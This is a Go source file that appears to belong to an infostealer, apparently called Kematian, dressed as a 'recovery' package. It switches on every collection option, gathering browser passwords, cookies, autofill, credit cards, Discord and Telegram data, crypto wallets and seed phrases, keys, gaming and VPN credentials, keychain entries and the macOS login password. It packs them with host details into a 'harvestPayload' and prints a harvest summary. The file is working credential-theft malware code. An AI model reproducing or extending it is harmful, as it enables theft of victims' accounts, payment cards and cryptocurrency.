package main

import (
	"runtime"
	"sync"

	"recovery/recovery"
)

type harvestPayload struct {
	Hostname string                    `json:"hostname"`
	OS       string                    `json:"os"`
	Arch     string                    `json:"arch"`
	Result   *recovery.CollectionResult `json:"result"`
	Seeds    []recovery.SeedResult     `json:"seeds,omitempty"`
}

func fullCollectOptions() recovery.CollectOptions {
	opts := recovery.CollectOptions{Browsers: true}
	opts.Passwords = true
	opts.Cookies = true
	opts.Autofill = true
	opts.History = true
	opts.Bookmarks = true
	opts.CreditCards = true
	opts.Discord = true
	opts.Files = true
	opts.Wallets = true
	opts.Keys = true
	opts.Telegram = true
	opts.Apps = true
	opts.Gaming = true
	opts.VPNs = true
	return opts
}

func runHarvest(hostname string) (*harvestPayload, error) {
	opts := fullCollectOptions()

	var extensions []recovery.ExtensionResult
	var extWg sync.WaitGroup
	extWg.Add(1)
	go func() {
		defer extWg.Done()
		extensions = recovery.ScanExtensions()
	}()

	result, err := recovery.Collect(opts, nil)
	if err != nil {
		return nil, err
	}

	extWg.Wait()
	result.Extensions = extensions

	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
	keychain := recovery.CollectKeychainPasswordCandidates()
	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychain)
	if mp := recovery.MacLoginPassword(); mp != "" {
		result.PasswordCandidates = appendMacLoginCandidate(result.PasswordCandidates, mp)
	}
	result.PasswordCandidates = recovery.AppendExtraPasswordCandidates(result.PasswordCandidates, result)

	return &harvestPayload{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Result:   result,
		Seeds:    seeds,
	}, nil
}

func harvestSummary(p *harvestPayload) string {
	if p == nil || p.Result == nil {
		return "Harvest complete (empty)"
	}
	r := p.Result
	return formatSummary(
		p.Hostname, p.OS, p.Arch,
		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
		len(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
	)
}

func countGaming(g *recovery.GamingResult) int {
	if g == nil {
		return 0
	}
	n := 0
	if g.Steam != nil {
		n++
	}
	n += len(g.BattleNet) + len(g.Epic) + len(g.Riot) + len(g.Uplay)
	return n
}

func countVPNs(v *recovery.VPNResult) int {
	if v == nil {
		return 0
	}
	return len(v.NordVPN) + len(v.WireGuard) + len(v.OpenVPN) + len(v.Mullvad)
}

func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, tg, apps, gaming, vpns, candidates, seeds int) string {
	return "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n" +
		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
		"keys: " + itoa(keys) + " | telegram: " + itoa(tg) + " | apps: " + itoa(apps) + "\n" +
		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
}

func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, password string) []recovery.PasswordCandidateResult {
	seen := make(map[string]bool, len(candidates))
	for _, c := range candidates {
		seen[c.Password] = true
	}
	if !seen[password] {
		candidates = append(candidates, recovery.PasswordCandidateResult{
			Password: password,
			Source:   "mac_login",
			Detail:   "macOS user password",
		})
	}
	return candidates
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}